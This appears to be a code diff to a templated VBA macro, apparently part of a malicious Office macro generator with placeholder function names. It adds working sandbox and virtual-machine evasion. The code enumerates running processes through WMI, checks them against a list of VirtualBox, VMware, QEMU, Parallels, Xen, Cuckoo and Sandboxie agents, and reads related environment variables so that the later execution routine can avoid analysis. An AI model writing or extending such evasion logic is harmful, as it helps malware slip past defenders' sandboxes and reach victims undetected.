@@ -148,6 +148,24 @@ Private Function {{ v.fn_sandbox }}() As Boolean
     End If
     On Error GoTo 0
     Set wmiSvc3 = Nothing
+    Dim wmiProc As Object
+    On Error Resume Next
+    Set wmiProc = GetObject("winmgmts:")
+    If Err.Number = 0 Then
+        Dim pQ As Object: Set pQ = wmiProc.ExecQuery("SELECT Name FROM Win32_Process")
+        Dim badProc: badProc = Array("vmtoolsd.exe","vboxservice.exe","cuckoo.exe","vmsrvc.exe","qemu-ga.exe","prl_tools.exe","xenservice.exe","sandboxiedcomlaunch.exe","vmusrvc.exe")
+        Dim oP As Object, pn As String, j As Integer
+        For Each oP In pQ
+            pn = LCase(oP.Name)
+            For j = 0 To UBound(badProc)
+                If pn = CStr(badProc(j)) Then {{ v.fn_sandbox }} = True: Set wmiProc = Nothing: Exit Function
+            Next j
+        Next oP
+    End If
+    On Error GoTo 0
+    Set wmiProc = Nothing
+    If Environ("VBOX_VERSION") <> "" Then {{ v.fn_sandbox }} = True: Exit Function
+    If Environ("SANDBOXIE_HOME") <> "" Then {{ v.fn_sandbox }} = True: Exit Function
 End Function
 
 Private Sub {{ v.fn_exec }}()
